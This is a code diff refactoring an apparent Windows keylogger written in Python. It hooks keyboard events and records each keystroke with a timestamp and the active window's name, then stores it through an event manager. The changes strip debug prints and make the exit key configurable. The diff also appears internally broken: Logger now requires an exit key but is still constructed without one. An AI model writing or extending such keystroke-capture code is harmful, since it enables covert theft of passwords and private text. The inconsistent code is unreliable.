@@ -19,13 +19,14 @@ def load_cfg(path):
 
 class Logger:
 
-    def __init__(self):
+    def __init__(self, exitKey):
         self.caps = False # is capital?
+        self.exitKey = exitKey
     
+    # Handler for KeyUp
     def OnKeyboardEventUp(self, event):
-        print("keyboard event UP")
         # Check exit condition
-        if chr(event.Ascii) == ']': 
+        if chr(event.Ascii) == self.exitKey: 
             sys.exit(1)
             
         # Check for 'shift' key
@@ -33,36 +34,17 @@ class Logger:
             self.toggleCaps()
             
         # Create KeyEvent object
-        # now = datetime.now()
-        # now_datetime = now.strftime("%d/%m/%Y %H:%M:%S")
-        # now_epoch = now.timestamp()
-        # isCaps = self.caps
-        # keyEvent = KeyEvent(now_datetime, now_epoch, event.MessageName, event.WindowName, event.Ascii, chr(event.Ascii), event.keyName, isCaps, self.processKey(chr(event.Ascii), isCaps))
         keyEvent = self.createKeyEvent(event)
-        
-        # print(event.KeyID)
-        # print(event.Message)
-        # print(event.Key)
-        # print(event.ScanCode)
-        # Print for debugging
-        # print(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
-        # print ('MessageName:',event.MessageName)
-        # print ('WindowName:',event.WindowName)
-        # print ('Ascii:', event.Ascii, chr(event.Ascii))
-        print(keyEvent)
-        print ('---')
-        
+                
         # Store KeyEvent
         eventManager.addEvent(keyEvent)
         
         return True
     
-        
-    def OnKeyboardEventDown(self, event):
-        print("keyboard event DOWN")
-    
+    # Handler for KeyDown
+    def OnKeyboardEventDown(self, event):    
         # Check exit condition
-        if chr(event.Ascii) == ']': 
+        if chr(event.Ascii) == self.exitKey: 
             sys.exit(1)
             
         # Check for 'shift' key
@@ -74,35 +56,25 @@ class Logger:
             self.toggleCaps()
             
         # Create KeyEvent object
-        # now = datetime.now()
-        # now_datetime = now.strftime("%d/%m/%Y %H:%M:%S")
-        # now_epoch = now.timestamp()
-        # isCaps = self.caps
-        # event = KeyEvent(now_datetime, now_epoch, event.MessageName, event.WindowName, event.Ascii, chr(event.Ascii), event.keyName, isCaps, self.processKey(chr(event.Ascii), isCaps))
-        
         keyEvent = self.createKeyEvent(event)
-        
-        # Print for debugging
-        # print(datetime.now().strftime("%d/%m/%Y %H:%M:%S"))
-        # print ('MessageName:',event.MessageName)
-        # print ('WindowName:',event.WindowName)
-        # print ('Ascii:', event.Ascii, chr(event.Ascii))
-        print(keyEvent)
-        print ('---')
-        
+                
         # Store KeyEvent
         eventManager.addEvent(keyEvent)
         
         return True
         
+    # Generate KeyEvent object
     def createKeyEvent(self, event):
         now = datetime.now()
         now_datetime = now.strftime("%d/%m/%Y %H:%M:%S")
         now_epoch = now.timestamp()
         isCaps = self.caps
         keyEvent = KeyEvent(now_datetime, now_epoch, event.MessageName, event.WindowName, event.Ascii, chr(event.Ascii), event.Key, isCaps, self.processKey(chr(event.Ascii), isCaps))
+        print(keyEvent)
+        
         return keyEvent
     
+    # Toggle the state of `self.caps`
     def toggleCaps(self):
         self.caps = not self.caps
     
@@ -126,7 +98,7 @@ if __name__ == "__main__":
     
     win = win32console.GetConsoleWindow()
     
-    eventManager = EventManager()
+    eventManager = EventManager(main_cfg["exitKey"])
     
     logger = Logger()
     
